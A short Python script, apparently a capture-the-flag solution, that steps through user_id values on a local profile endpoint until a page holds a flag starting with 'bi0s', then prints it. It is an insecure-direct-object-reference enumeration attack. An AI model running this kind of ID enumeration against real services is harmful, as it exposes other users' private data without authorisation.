import requests

for i in range(1,100):
    url=f"http://localhost:3000/profile?user_id={i}"
    res=requests.get(url)   
    if "bi0s" in res.text:
        print("Flag in user_id: ",i)
        a=str(res.text)
        print(a[a.find("bi0s"):a.find("}")+1])
        break
